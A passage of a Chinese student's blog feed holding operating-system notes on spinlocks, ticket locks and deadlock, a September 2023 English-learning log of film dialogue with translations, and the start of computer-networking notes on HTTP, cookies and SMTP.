class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cas</span><span class="params">(<span class="type">int</span> *addr, <span class="type">int</span> cmp_val, <span class="type">int</span> new_val)</span> &#123;</span><br><span class="line">  <span class="type">int</span> old_val = *addr;</span><br><span class="line">  <span class="keyword">if</span> (old_val == cmp_val) &#123;</span><br><span class="line">    *addr = new_val; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cas:</span><br><span class="line">  lr.w  t0, (a0)       # Load original value.</span><br><span class="line">  bne   t0, a1, fail   # Doesn’t match, so fail.</span><br><span class="line">  sc.w  t0, a2, (a0)   # Try to update.</span><br><span class="line">  bnez  t0, cas        # Retry if store-conditional failed.</span><br><span class="line">  li a0, 0             # Set return to success.</span><br><span class="line">  jr ra                # Return.</span><br><span class="line">fail:</span><br><span class="line">  li a0, 1             # Set return to failure.</span><br><span class="line">  jr ra                # Return</span><br></pre></td></tr></table></figure><p><strong>自旋锁评价</strong></p><ul><li><p>正确性 👍</p></li><li><p>公平性 👎</p></li><li><p>性能</p><ul><li>单核处理器竞争，每个竞争锁的线程都会浪费一个时间片</li><li>多核处理器竞争，临界区一般很短，另一个处理器上的竞争锁的线程会很快得到锁</li></ul></li></ul><h3 id="ticket锁"><a href="#ticket锁" class="headerlink" title="ticket锁"></a>ticket锁</h3><p>利用硬件原语fetch-and-add，原子地返回特定地址的旧值，并且让该值自增一</p><p><strong>x86</strong></p><p>xadd dest,src指令：Exchange and Add</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dest，src先交换，然后再把两者之和付给dest</span><br><span class="line">TEMP := SRC + DEST;</span><br><span class="line">SRC := DEST;</span><br><span class="line">DEST := TEMP;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">fetch_and_add</span><span class="params">(<span class="type">int</span>* variable, <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lock; xaddl %0, %1&quot;</span></span></span><br><span class="line"><span class="params">                     : <span class="string">&quot;+r&quot;</span> (value), <span class="string">&quot;+m&quot;</span> (*variable) <span class="comment">// input+output</span></span></span><br><span class="line"><span class="params">                     : <span class="comment">// No input-only</span></span></span><br><span class="line"><span class="params">                     : <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">                    )</span>;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ticket锁</strong>实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FetchAndAdd</span><span class="params">(<span class="type">int</span> *ptr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> old = *ptr;</span><br><span class="line">    *ptr = old + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> ticket;</span><br><span class="line">    <span class="type">int</span> turn;</span><br><span class="line">&#125; <span class="type">lock_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    lock-&gt;ticket = <span class="number">0</span>;</span><br><span class="line">    lock-&gt;turn = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    <span class="type">int</span> myturn = FetchAndAdd(&amp;lock-&gt;ticket);</span><br><span class="line">    <span class="keyword">while</span> (lock-&gt;turn != myturn)</span><br><span class="line">        ; <span class="comment">// spin</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    FetchAndAdd(&amp;lock-&gt;turn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ticket能够保证每一个竞争线程都能够抢到锁，且按照自旋等待的先后顺序</p><h2 id="操作系统支持"><a href="#操作系统支持" class="headerlink" title="操作系统支持"></a>操作系统支持</h2><p>对于简单的yield+自旋，yield()系统调用让线程让出cpu，可能操作系统下次还是选择运行该线程，同时其他线程只能看着有锁的线程做事，虽然比浪费完整时间片要好，但是系统调用的上下文切换开销也很大</p><h3 id="park-自旋锁"><a href="#park-自旋锁" class="headerlink" title="park+自旋锁"></a>park+自旋锁</h3><p><strong>Solaris</strong></p><p>Solaris系统提供了系统调用，park()能够让调用线程休眠，unpark(threadID)则会唤醒 threadID 标识的线程。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock_t</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> flag;</span><br><span class="line">  <span class="type">int</span> guard;</span><br><span class="line">  <span class="type">queue_t</span> *q;<span class="comment">//队列防止了饿死某个线程的问题</span></span><br><span class="line">&#125; <span class="type">lock_t</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  m-&gt;flag = <span class="number">0</span>;</span><br><span class="line">  m-&gt;guard = <span class="number">0</span>;</span><br><span class="line">  queue_init(m-&gt;q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//获取锁或者释放锁其他线程还是需要自旋，来保证内存一致</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">    m-&gt;flag = <span class="number">1</span>; <span class="comment">// lock is acquired 真正获取锁</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//设置后有线程抢锁会结束自旋，加入队列</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    queue_add(m-&gt;q, gettid());</span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//设置后有线程抢锁会结束自旋，加入队列</span></span><br><span class="line">    park();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//获取锁或者释放锁其他线程还是需要自旋，来保证内存一致</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (queue_empty(m-&gt;q))</span><br><span class="line">    m-&gt;flag = <span class="number">0</span>; <span class="comment">// let go of lock; no one wants it</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    unpark(queue_remove(m-&gt;q)); <span class="comment">// hold lock (for next thread!)直接把flag的锁给下一个线程即可，</span></span><br><span class="line">  m-&gt;guard = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题:假设一个线程已经加入休眠队列将要调用park休眠,此时如果系统切换到了正在持有锁的线程。如果该线程随后释放了锁，前面的线程调用park后可能会永远休眠下去。</p><p>Solaris增加了第三个系统调用 separk()来解决问题</p><p>setpark():一个线程表明自己马上要 park。如果刚好另一个线程被调度，并且调用了 unpark，那么后续的park调用就会直接返回,不会休眠</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//获取锁或者释放锁其他线程还是需要自旋，来保证内存一致</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">    m-&gt;flag = <span class="number">1</span>; <span class="comment">// lock is acquired 真正获取锁</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//设置后有线程抢锁会结束自旋，加入队列</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    queue_add(m-&gt;q, gettid());</span><br><span class="line">    setpark();<span class="comment">// new code</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//设置后有线程抢锁会结束自旋，加入队列</span></span><br><span class="line">    park();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>死锁一般有以下四个必要条件</p><ul><li>互斥，线程对于需要的资源进行互斥的访问</li><li>持有和等待，线程持有已有的资源，同时等待使用下一个资源。</li><li>不可抢占，进程所获得的资源在未使用完毕之前，资源申请者不能强行地从资源占有者手中夺取资源，而只能由该资源的占有者进程自行释放。</li><li>循环等待，线程之间存在一个环路，环路上每个线程都额外持有一个资源，而这个资源又是下一个线程要申请的。</li></ul><p>如果这 4 个条件的任何一个没有满足，死锁就不会产生。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>English learning September 2023</title>
      <link href="/2023/09/01/Englishlearning-September2023/"/>
      <url>/2023/09/01/Englishlearning-September2023/</url>
      
        <content type="html"><![CDATA[<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><p>46天了，目前已经养成了习惯，目的已经达到，不会再记录了,收获良多，keep running   2023.9.16 grxer</p><h2 id="9-1"><a href="#9-1" class="headerlink" title="9.1"></a>9.1</h2><p><a href="https://www.bilibili.com/video/BV1dj411K7Bs/">https://www.bilibili.com/video/BV1dj411K7Bs/</a></p><p>i want you to listen very closely to what i’m about to say. </p><p>from this moment on ,you are a rock</p><p>你要仔细听好我接下啦说的话，从这一刻起，你就是一块岩石</p><p>you absorb nothing ,you say nothing and nothing breaks you.is that clear</p><p>不闻不问，不言不语，坚不可摧，明白了吗</p><p>yes sir</p><ul><li>absorb v. 承担 吸收；使并入，纳入；同化，汲取</li></ul><h2 id="9-2"><a href="#9-2" class="headerlink" title="9.2"></a>9.2</h2><p><a href="https://www.bilibili.com/video/BV1p24y1s7RU">https://www.bilibili.com/video/BV1p24y1s7RU</a></p><p>i was very sorry to here about gerry’s father</p><p>gerry父亲的事情我很难过</p><p>i’ll go to the funeral with you ,if you like</p><p>如果你愿意，我会跟你去葬礼</p><p>there isn’t gonne be funeral。just a memorial service，then they’ll scatter his a ashes，that’s how they do it</p><p>没有办葬礼，只有追悼会。然后他们会把骨灰散掉，大致就是这样</p><ul><li><p>funeral n.葬礼</p><p>be someone’s funeral 自作自受</p><p>i told you to work hard,but you always turned a deaf ears to me ,it’s your funeral</p><p>我告诉过你要努力工作，但是你总当耳旁风，这是你自作自</p></li></ul><h2 id="9-3"><a href="#9-3" class="headerlink" title="9.3"></a>9.3</h2><p><a href="https://www.bilibili.com/video/BV148411M7ef">https://www.bilibili.com/video/BV148411M7ef</a></p><p>the chanel look that i had last march in paris</p><p>我去年三月在巴黎的香奈儿造型。</p><p>i had a black puffy jacket with the subtle Chanel logo and a matching set inside a cute mini skirt and a corset</p><p>我穿了一件蓬松的，有着不是很明显的香奈儿标志的夹克外套，里面搭了漂亮的迷你裙和紧身衣。</p><p>i did this really cute braided hair that i’ver never tried before,but turned out to be really amazing.i loved it.</p><p>我弄了个非常可爱的编发是我之前没尝试过的，但是很棒，我很喜欢</p><ul><li><p>puffy 肿胀的，蓬松的</p><p>i’ll wake up the next morning with really puffy eyes</p><p>第二天早上我起来眼睛会肿</p></li></ul><h2 id="9-4"><a href="#9-4" class="headerlink" title="9.4"></a>9.4</h2><p><a href="https://www.bilibili.com/video/BV1tM411P7HX">https://www.bilibili.com/video/BV1tM411P7HX</a></p><p>i took you advice,i wanted something ,and i went for it</p><p>我接受了你的建议。我想要什么，就去争取。</p><p>i made the selfish move ,and i ended up fighting a  zombie</p><p>由于这些自私的举动，最后我和僵尸打了起来</p><p>there’s room for people in this world that just care about other perple</p><p>这个世界上还有位置给那些只关心别人的人</p><p>Not everyone has to be a showboat</p><p>不是每个人都要成为焦点。</p><p>you‘re right。this world needs the selfless and selfish to keep spinning</p><p>没错。这个世界需要无私的人和自私的人才能继续转动。</p><ul><li><p>end up 最终</p><p>you can end up hiding from each other</p><p>你们最终会相互躲避</p></li><li><p>showboat n.爱卖弄的人 v.卖弄，炫耀</p><p>other statemen loved to showboat</p></li></ul><h2 id="9-5"><a href="#9-5" class="headerlink" title="9.5"></a>9.5</h2><p><a href="https://www.bilibili.com/video/BV1bG4y1P7LK/">https://www.bilibili.com/video/BV1bG4y1P7LK/</a></p><p>he broke up with you over text message，it‘s kinda like firing someone over the internet</p><p>他发短信和你分手？有点像在网上解雇别人。</p><p>what a weaselly prick</p><p>真是个狡猾的混蛋。</p><p>yeah，but what dose that make me？someone who falls for a prick</p><p>是啊，但我又是什么呢？爱上混蛋的人。</p><p>we all fall for them。pricks are spontaneous。they’re unpredictable and they‘re fun</p><p>我们都喜欢混蛋。混蛋随意自然。他们捉摸不透也很有趣。</p><ul><li>weaselly 狡猾的</li><li>prick 混蛋</li><li>fall for 迷恋上</li><li>spontaneous 自然的，随意的</li></ul><h2 id="9-6"><a href="#9-6" class="headerlink" title="9.6"></a>9.6</h2><p><a href="https://www.bilibili.com/video/BV1Y54y1P7eo/">https://www.bilibili.com/video/BV1Y54y1P7eo/</a></p><p>i get up in the morning to do this job i don’t even like .and I’m doing it just for the monry and it’s not even a lotta money</p><p>我一大早起来就要去做这个我根本不喜欢的工作。我只是为了赚钱才做的，还赚不了多少。</p><p>i keep trying harder and harder and it doesn’t even make a difference</p><p>我一直不停的努力，但一点用都没有。</p><p>so if you’re going to yell at me or punish me let’s just get it over with.</p><p>所以如果你要骂我或者惩罚我，那就赶紧来吧。</p><ul><li>yell at sb 大声责骂，呵斥：对某人发火</li></ul><h2 id="9-7"><a href="#9-7" class="headerlink" title="9.7"></a>9.7</h2><p><a href="https://www.bilibili.com/video/BV13T411U7gE/">https://www.bilibili.com/video/BV13T411U7gE/</a></p><p>so,how did you guys meet?</p><p>所以，你们是怎么认识的？</p><p>At a conference.i mean can you believe it?She’s a rocket scientist</p><p>在一个大型会议上。你信吗？她是个火箭科学家。</p><p>No,i’m not.</p><p>不，我不是</p><p>yes you are.</p><p>你就是啊</p><p>i’m actually just an engineer，but he loves to say that</p><p>我其实只是个工程师，但他喜欢这么捧我。</p><h2 id="9-8"><a href="#9-8" class="headerlink" title="9.8"></a>9.8</h2><p><a href="https://www.bilibili.com/video/BV1Ju4y1F7ki/">https://www.bilibili.com/video/BV1Ju4y1F7ki/</a></p><p>the bitter irony of the fact that 10 year old me is far cooler than 20 year old me</p><p>我十岁的时候比二十岁的时候还酷，这是个辛辣的讽刺</p><p>I think 20 year old dave is…He’s all right</p><p>我觉得二十岁的Dave挺好的啊</p><p>Like “all right” all right or ”all right ” all right?</p><p>是”还凑合”的那种好，还是”太棒了”的那种好</p><p>I think he is somewhere in the middle</p><p>我觉得他….. 介于两者之间吧</p><p>that’s a diplomatic answer</p><p>真巧妙的回答</p><h2 id="9-9"><a href="#9-9" class="headerlink" title="9.9"></a>9.9</h2><p><a href="https://www.bilibili.com/video/BV16A411274T/">https://www.bilibili.com/video/BV16A411274T/</a></p><p>The childhood dream of playing for my hometown team came true in 2004</p><p>在04年，我终于实现了为家乡球队效力的梦想。</p><p>at that time it felt like the beginning of a new chapter</p><p>我本以为这将开始我人生的新篇章。</p><p>but little did i know,this would be the beginning of the end</p><p>但我不知道的是，这其实是终章的到来。</p><p>during the game we palyed against the phoenix suns on the night fo december secnod,2007(two thousand and seven)</p><p>2007年12月2日晚上，我们主场迎战凤凰城太阳队，</p><p>My father in attendance was rushed to the hospital with chest pains</p><p>看台上的父亲突发心脏病被送往医院。</p><h2 id="9-10"><a href="#9-10" class="headerlink" title="9.10"></a>9.10</h2><p><a href="https://www.bilibili.com/video/BV1Vj411P7Dv">https://www.bilibili.com/video/BV1Vj411P7Dv</a></p><p>About that …</p><p>关于那个……</p><p>oh, save you breath，we know you lied ,you’re terrible liar</p><p>省省吧，我们知道你在撒谎。你真不会撒谎。</p><p>if you knew i lied ,then why would you help me</p><p>既然你们知道我在撒谎，为什么还要帮我？</p><p>we don’t need a reason to torment mortal boys</p><p>折磨凡界男子不需要理由。</p><p>but if you are transferring to the Academy ,why bother with the boys at all</p><p>但如果你要转来学院，干嘛还要管那些男生？</p><p>they’ll soon be out of you life</p><p>i don’t want them harassing my friends when i’m gone</p><p>他们马上就与你无关了。我不想他们在我走后骚扰我朋友。</p><ul><li>save you breath 省省口舌</li></ul><h2 id="9-11"><a href="#9-11" class="headerlink" title="9.11"></a>9.11</h2><p><a href="https://www.bilibili.com/video/BV1oT411U75J">https://www.bilibili.com/video/BV1oT411U75J</a></p><p>Okay,i get it. you guys think i’m a terrible mother</p><p>我懂了。你们觉得我这个妈当的不称职。</p><p>I work long hours ,i can’t be home</p><p>没有。我天天加班，没办法在家。</p><p>you produce a morning cooking show</p><p>你制作的是一个早间烹饪节目。</p><p>you get off at 1:00 every day</p><p>你每天下午一点就下班了</p><p>Yeah that is true</p><p>确实</p><p>but it’s a hight stress job,Okay ? And i need time to decompress before i go home ,before they go to bed</p><p>但是这个工作压力可大了。我需要在我回家前,在他们睡觉前消化完这些。</p><h2 id="9-12"><a href="#9-12" class="headerlink" title="9.12"></a>9.12</h2><p><a href="https://www.bilibili.com/video/BV11M4y1Z7jP">https://www.bilibili.com/video/BV11M4y1Z7jP</a></p><p>wait a minuite ,what’s your name</p><p>等等，你叫什么名字？</p><p>let’s keep that a secret</p><p>让我们保守秘密吧。</p><p>i don’t even know it</p><p>我都不知道你的名字啊。</p><p>well ,then you’ll keep it even better</p><p>那你守得更好了。</p><p>what you star sign？i‘m an experienced astronomer。</p><p>你是什么星座的？我是个经验丰富的天文学家。</p><p>you try pisces，the fish</p><p>双鱼座</p><h2 id="9-13"><a href="#9-13" class="headerlink" title="9.13"></a>9.13</h2><p><a href="https://www.bilibili.com/video/BV1Ns4y187Ab/">https://www.bilibili.com/video/BV1Ns4y187Ab/</a></p><p>Can i help you</p><p>Check this book out </p><p>Okey ,do you have a library card</p><p>do you live in town</p><p>我可以帮你吗？借这本书。好的，嗯，你有借书卡吗？没有。好的，你住在镇上吗？是的。</p><p>i need a proof of address.so if you could bring in a piece of mail,then i can give you a card</p><p>我需要一个地址证明，所以要是你能带来一封邮件，我就能给你张卡。</p><h2 id="9-14"><a href="#9-14" class="headerlink" title="9.14"></a>9.14</h2><p><a href="https://www.bilibili.com/video/BV1dX4y197Ce/">https://www.bilibili.com/video/BV1dX4y197Ce/</a></p><p>you’re gonna walk to boston,how long is that gonna take?</p><p>你们准备走到Boston? 这要多久啊？</p><p>eight,eight and a half months</p><p>八个，八个半月</p><p>so into the winter</p><p>所以 要到冬天？</p><p>what if you don’t make it that far</p><p>如果你们走不到那么远怎么办？</p><p>then we’ll hole up somethere</p><p>那我们就躲在某个地方</p><p>Where? Who’s gonna take in an extra half-dozen starving people for the winter?</p><p>哪里？谁会在冬天里再接纳几个餓得要命的人呢？</p><h2 id="9-15"><a href="#9-15" class="headerlink" title="9.15"></a>9.15</h2><p><a href="https://www.bilibili.com/video/BV1tg4y1J7V9/">https://www.bilibili.com/video/BV1tg4y1J7V9/</a></p><p>what’s the biggest suprise you’ve ever had</p><p>你曾有过的最大惊喜是什么？</p><p>my mom brought home a child from  a yard sale once,true story</p><p>我妈有次在庭院拍卖会上带回来个孩子，真的。</p><p>what’s a suprise that make you cry,stubbing my toe</p><p>你所策划的给某人最好的惊喜是什么？</p><p>um a collection of short stories writeen by loved one for my husband</p><p>一个由亲人写给我老公的短篇小说集。</p><p>what’s you favorite plot twist? vertigon</p><p>你最爱的曲折情节是（哪部电影的）？《迷魂记》。</p><h2 id="9-16"><a href="#9-16" class="headerlink" title="9.16"></a>9.16</h2><p><a href="https://www.bilibili.com/video/BV1DT411e7Ka">https://www.bilibili.com/video/BV1DT411e7Ka</a></p><p>I’am not the only one who’s worried</p><p>我不是唯一担心你的人。</p><p>oh my god，my parents, tell me they didn’t reach out to you</p><p>老天，我的父母……别告诉我他们联系你了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Heap</title>
      <link href="/2023/09/01/kernel-heap/"/>
      <url>/2023/09/01/kernel-heap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络:分层模型&amp;&amp;应用层</title>
      <link href="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/OSI.jpg" alt="OSI"></p><h1 id="分层模型"><a href="#分层模型" class="headerlink" title="分层模型"></a>分层模型</h1><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827150702534.png" alt="image-20230827150702534"></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230907123035154.png" alt="image-20230907123035154"></p><p>每一层利用下层提供的服务为基础来为上层提供服务，最终服务于应用层的应用程序</p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="网络应用的体系结构"><a href="#网络应用的体系结构" class="headerlink" title="网络应用的体系结构"></a>网络应用的体系结构</h2><ul><li>客户-服务器模式 (C&#x2F;S:client&#x2F;server)<ul><li>服务器先且一直运行，守护在某些端口上</li><li>可拓展性，可靠性比较差</li><li>客户数量达到一定阈值后会断崖式下降</li></ul></li><li>对等模式 (P2P:Peer To Peer)<ul><li>任意端系统之间可以通信，每个节点即使客户端又是服务器</li><li>自拓展性</li><li>迅雷，快播😳</li></ul></li><li>混合体 客户-服务器和对等体系结构</li></ul><h2 id="跨端系统进程通信"><a href="#跨端系统进程通信" class="headerlink" title="跨端系统进程通信"></a>跨端系统进程通信</h2><p>通过套接字(socket)来从网络发送和接受报文，应用程序开发者控制套接字在应用层的一切，对套接字在传输层的控制几乎为0</p><blockquote><p>socket具体看这篇文章: <a href="https://segmentfault.com/a/1190000041413541">https://segmentfault.com/a/1190000041413541</a></p><p>简单来说tcp socket就是操作系统维护的一个五元组**[源IP, 源端口, 目的IP, 目的端口, 类型(TCP or UDP)]<strong>，udp socket就是一个三元组</strong>[目的IP, 目的端口, 类型(TCP or UDP)]**，返回的socket就是这个数组的下标</p></blockquote><p>跨端系统进程通信需要的信息</p><ul><li>目标主机地址:IP地址</li><li>所采用传输层协议:TCP or UDP</li><li>目标主机中目标进程的标识符:端口号</li></ul><p>套接字是应用程序进程和传输层协议直接的接口，使用哪种传输层协议，需要结合应用进程的要求</p><ul><li>可靠数据传输</li><li>吞吐量</li><li>定时</li><li>安全性</li></ul><p>因特网提供了UDP和TCP两种传输层协议</p><ul><li>TCP：Transmission Control Protocol<ul><li>面向连接</li><li>可靠数据传输服务</li><li>拥塞控制机制</li></ul></li><li>UDP：User Datagram Protocol<ul><li>无连接</li><li>不可靠</li><li>无拥塞控制</li></ul></li></ul><blockquote><p>TCP安全是靠安全套接字层(secure sockets layer,SSL)来实现的，SSL在<strong>应用层</strong>实现</p></blockquote><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>http 超文本传输协议(hypertext transfer protocol) 使用tcp作为传输层协议，是一个无状态协议(不保存关于客户的任何信息) 默认80端口</p><p>http&#x2F;1.0采用非持续连接，http&#x2F;1.1默认采用持续连接</p><blockquote><p>非持续,持续连接区别在于一个对象传输结束后，是否立即关闭tcp连接</p><p>流水线，一个请求对象还没到达时，再去请求另一个对象</p><p>非流水线 一个一个完整请求，请求-到达-请求-到达…………</p></blockquote><p>URL基本格式: </p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">protocol://user:password@www.someSchool.edu/someDept/pic.gif:port</span><br><span class="line">协议         用户名 口令      主机名             路径名 端口</span><br></pre></td></tr></table></figure><p><strong>HTTP请求报文的通用格式</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827121842745.png" alt="image-20230827121842745"></p><blockquote><p>post方法时才会使用请求实体体</p></blockquote><p><strong>HTTP响应报文的通用格式</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827122100051.png" alt="image-20230827122100051"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>http是无状态的，为了识别用户，实现某写功能，采用了cookie与用户身份联系起来</p><p>cookie组件</p><ul><li>请求和响应报文的cookie首部行</li><li>用户端系统的cookie文件，由浏览器管理</li><li>web后端数据库</li></ul><p>用户第一次访问某个web站点时，web站点会生成一个唯一识别码，并把他当成索引在后端数据库产生一个表项，发送的响应报文会有<code>Set-cookie的首部行</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-cookie</span><span class="punctuation">: </span>xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>浏览器接受到响应报文后，会在本地cookie文件里添加一行服务器的主机名和cookie值，随后每次对该web的请求都会带有cookie首部行</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxxxxxxxxxx</span><br></pre></td></tr></table></figure><h3 id="web缓存器-代理服务器"><a href="#web缓存器-代理服务器" class="headerlink" title="web缓存器(代理服务器)"></a>web缓存器(代理服务器)</h3><p>可以配置浏览器，使http请求首先经过web缓存器，如果web缓存器存有请求对象的副本，直接返回给浏览器，否则缓存器向原始服务器http请求，把响应对象存储到web缓存器，再通过web缓存器和浏览器原本的tcp连接把对象再返回给浏览器</p><blockquote><p>二八定律，使缓存效果良好</p></blockquote><h4 id="条件get方法"><a href="#条件get方法" class="headerlink" title="条件get方法"></a>条件get方法</h4><p>为了避免web缓存器里的副本和原始服务器里的版本不一致，存在一种机制:条件get方法</p><p>请求报文使用get方法，包含<code>If-Modified-Since：</code>首部行，就是一个条件get请求报文</p><p><strong>具体过程</strong></p><p>web缓存器向原始服务器请求对象，服务器发送的响应报文里下面一句</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Wed, 9 Sep 2023 06:23:45</span><br></pre></td></tr></table></figure><p>缓存器存储对象时会记下修改时间</p><p>一段时间用户再次请求该对象时，缓存器会向服务器发送条件get请求报文</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Get /path/xxx.jpg HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.grxer.com</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 9 Sep 2023 06:23:45</span><br></pre></td></tr></table></figure><p>如果对象已经修改，在get实体体里返回200ok 实体体里包含该对象，否则返回304 Not Modified,告诉web缓存器可以直接使用该对象</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">304</span> Not Modified</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="language-clojure">(<span class="name"><span class="built_in">empty</span></span> entity body)</span></span><br></pre></td></tr></table></figure><h2 id="E-Mail"><a href="#E-Mail" class="headerlink" title="E-Mail"></a>E-Mail</h2><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230828230533757.png" alt="image-20230828230533757"></p><p>三个重要组成部分</p><ul><li>用户代理 user agent</li><li>邮件服务器 mail server </li><li>简单邮件传输协议SMTP simple mail transfer protocol</li></ul><h3 id="SMTP-推协议"><a href="#SMTP-推协议" class="headerlink" title="SMTP(推协议)"></a>SMTP(推协议)</h3><p>使用TCP作为传输层协议 默认25号端口，连续连接</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230829110643721.png" 